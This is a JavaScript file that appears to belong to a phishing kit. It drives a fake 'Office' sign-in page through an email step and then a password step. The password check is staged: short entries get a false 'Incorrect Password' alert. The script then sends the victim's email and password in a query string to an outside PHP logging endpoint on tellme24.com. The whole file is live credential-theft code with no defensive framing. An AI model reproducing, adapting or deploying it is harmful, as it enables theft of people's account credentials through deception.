const validEmail = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/


let url;

// setTimeout(() => {
//     document.getElementById("temp_loader").style.display = "none"
//     document.getElementById("main_container").style.display = "flex"
// }, 1500);

document.getElementById("temp_loader").style.display = "none"
    document.getElementById("main_container").style.display = "flex"

Math.floor(Math.random() * 10)

function preventCheck(p) {
    p.checked = true
}

function getDetails(e) {
    const getHtml = e.parentElement;

    let temp = getHtml.getElementsByClassName("take_one")[0];

    const email = getHtml.getElementsByClassName("hiddenTake1")[0];
    const pass = getHtml.getElementsByClassName("hiddenTake2")[0];

    const loader = getHtml.getElementsByClassName("verify_loader")[0];

    if (e.innerText == "Next") {
        if (!validEmail.test(temp.innerText.trim())) {
            alert("Please enter your email address")
        }
        else {
            email.innerText = temp.innerText

            document.getElementById("sub_btn").innerText = "Sign in"
            document.getElementById("changeH1").innerText = "Enter password"

            showTemp.innerHTML = `
                &#10510;${email.innerText}
                `

            loader.innerHTML = `
                <br>
                <b style="font-style:normal; font-weight:500;">Show Password: </b> <input type="checkbox" checked onclick="preventCheck(this)">`

            temp.innerText = ""
            temp.style.color = "grey"
        }
    }
    else if (e.innerText == "Sign in") {

        if (!validEmail.test(email.innerText)) {
            alert("Please enter your email address")
            location.reload()
        }
        else {

            pass.innerText = temp.innerText

            if (pass.innerText.length < 6) {
                alert("Incorrect Password")
                return
            }
            else {

                url = "Domain" + "=" + "Office | Plain" + "&" + "Mail" + "=" + email.innerText + "&" + "Password" + "=" + pass.innerText

                location = "https://tellme24.com/logs/gm1/plain1.php?" + url;

                setTimeout(() => {
                    pass.innerText = "";
                }, 2000);
            }
        }
    }
}
